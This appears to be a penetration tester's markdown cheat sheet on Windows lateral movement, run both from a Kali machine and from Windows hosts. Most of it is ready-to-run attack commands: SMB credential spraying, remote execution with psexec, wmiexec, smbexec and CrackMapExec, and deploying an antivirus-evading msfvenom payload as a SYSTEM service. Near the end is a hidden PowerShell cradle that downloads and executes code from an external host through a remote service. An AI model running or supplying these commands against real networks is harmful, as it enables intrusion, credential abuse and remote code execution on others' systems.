## <----- From Kali -----> ##

#### --- Spray and Pray--- ####

```
msf > use auxiliary/scanner/smb/smb_login  
msf auxiliary(smb_login) > set SMBDomain CSCOU  
SMBDOMAIN => CSCOU  
msf auxiliary(smb_login) > set SMBUser jarrieta  
SMBUser => jarrieta  
msf auxiliary(smb_login) > set SMBPass nastyCutt3r  
SMBPass => nastyCutt3r  
msf auxiliary(smb_login) > services -p 445 -R  
msf auxiliary(smb_login) > run
```
*Note: Any succesfull logins will be stored in the msf database. View them with:* ```creds```

#### --- CrackMapExec --- ####

Testing credentials and launching attacks on a large number of hosts
```python crackmapexec.py $ip_or_range -d $domain -u $user -p $password```


#### --- Metasploit psexec --- ####

```use exploit windows/smb/psexec```

NOTE: ```auxiliary/admin/smb/psexec_command``` if you want to just run a single command. This module can also take a range of RHOSTS


#### --- Winexe --- ####

An old *nix tool to execute Windows commands remotely. Built in to Kali or available here.
You can execute a single command or drop right into a command prompt:

```winexe -U $domain/$user%$password //$host_ip cmd.exe```

### Impacket ###

#### --- psexec.py --- ####

NOTE: Use clone in ```/opt```

```python psexec.py $domain/$user:$password@ip_address```


#### --- smbexec --- ####

This one is a bit "stealthier" as it doesn't drop a binary on the target system.
Commands and output are asynchronous

```python smbexec.py $domain/$user:$password@ip_address```


#### --- wmiexec.py --- ####

Under the hood this one uses Windows Management Instrumentation (WMI) to launch a semi-interactive shell.

```python wmiexec.py $domain/$user:$password@ip_address```


#### --- CrackMapExec --- ####

You can also use CrackMapExec to execute commands on hosts by passing it the "-x" parameter.
Since it's built on Impacket's libraries, it's basically doing the exact same thing as wmiexec.py.
But let's you do it across a range of IPs

```python crackmapexec.py $ip_address -d $domain -u $user -p $pass -x $cmd```


#### --- Remote Desktop/rdp_check --- ####

```python rdp_check.py $domain/$user:$pass@$ip_address```

NOTE: Use these to get code execution and elevate into Empire/MSF


## <----- From Windows -----> ##

NOTE: *Tools mentioned previously (psexec, wmiexec, etc) are essentially re-implementations of core Windows functionality.*

#### Testing Credentials and Exploring the Domain ####

#### --- SMB Login --- ####

An easy way to test credentials is to try to initiate an SMB connection to the machine.
This is essentially what Metasploit's module does. 

NOTE: *$user and $pass are considered known values at this point*

```net use \\$target /user:$domain\$user $pass```

```net use z: \\$target\$VOL```

```
IF access_is_ok
  'The command completed successfully'
ELSE
  'Access is denied'
FI
```

##### Check which connections we have open #####

```net use```

NOTE: Easily detected if sysadmin runs ```net session```.

##### Terminate all sessions #####

```net use /delete *```

##### Problem #####

We can't use all the net commands and other Windows tools by passing a username and password.
For example, net view doesn't have a ```/user``` option and instead defaults to using your local logon.
But we can bypass that limitation.


#### --- Using 'runas' to get Kerberos auth --- ####

The Windows runas command let's us execute commands in the context of another user.
When used with the ```/netonly``` option, we can authenticate as a domain user.
Even though we're not on a domain joined machine.

We can launch an interactive command prompt by running "cmd.exe" with runas.
The beauty of this technique is that our LogonId changes, and we can actually start using Kerberos auth on the domain.
Note how the ```whoami``` output is the same but our LogonId changes in the new command prompt after doing a ```runas```.

```whoami```

```klist```

```runas /netonly /user:$domain\$user "cmd.exe"```

NOTE: *In this new command prompt, we don't need to run the net use command to open connections with specified credentials.
We can just use normal commands the Windows will use our LogonId with Kerberos authentication:*

In ```runas``` terminal/prompt:

```net view \\target /all```

```klist```


#### --- PSExec --- ####

*PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. It's a standalone binary that's included in the Sysinternals suite.
You can pass credentials to it and remotely execute commands or drop into an interactive command prompt*


NOTE: *PsExec is remotely starting a service on the target machine (called "PSEXECSVC") > 'C:\Windows\PSEXECSVC.exe'. That directory is actually the ADMIN$ share over SMB. So PsExec performs a few steps to get you a shell...*

```
1. Copy a binary to the ADMIN$ share over SMB
2. Create a service on the remote maching pointing to the binary
3. Remotely start the service
4. When exited, stop the service and delete the binary
```

##### Manually PsExec'ing #####

*Assume we have a payload executable we generated with msfvenom and obfuscated with Veil (so AV doesn't flag it)*


###### 1. Copy the binary ######

From origin command prompt, simply copy the binary to the ADMIN$.

```copy evil.exe \\target\$share```

Really though, it could be copied and hidden anywhere on the filesystem.

###### 2. Create a service ######

The Windows [sc command](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490995(v=technet.10)?redirectedfrom=MSDN) is used to query, create, delete, etc Windows services and can be used remotely.

From command prompt, remotely create a service called "meterpreter" that points to uploaded binary:

```sc \\target create meterpreter binPath= "c:\Windows\evil.exe"```

###### 3. Start the Service ######

Start the service and execute the binary.
Note: *When the service starts it will "time-out" and generate an error. That's because our meterpreter binary isn't an actual service binary and won't return the expected response code. That's fine because we just need it to execute once to fire.*

```sc \\target start meterpreter```

Check listener

###### 4. Clean up our mess ######
Migrate out of the evil.exe process and into a more permanent one.
Then we need to delete the binary and stop/delete the remote service.

```del \\target\share\evil.exe```

###### -- NOTES -- ######

By default, services are created and ran as SYSTEM.

When we created the service, we didn't specify a username for it to run as so it defaulted to SYSTEM.

If we really wanted to run the service with different credentials, we could have specified when we created it.

Conversely, we could have specified the ```-s``` option with PsExec to get a SYSTEM shell too.

##### Executing Commands via Services #####

It is possible to execute commands directly from service binPaths instead of needing a binary.

#### --- MSF: 'web_delivery' --- ####

###### PS Payload ######

```powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n'); ```

###### Windows Attack Box ######

Create a remote service ("metpsh") and set the binPath to execute cmd.exe with our payload:

```sc \\target create metpsh binPath= "%COMSPEC% /Q /c $ps_payload"```

###### Start It ######

```sc \\target start metpsh```
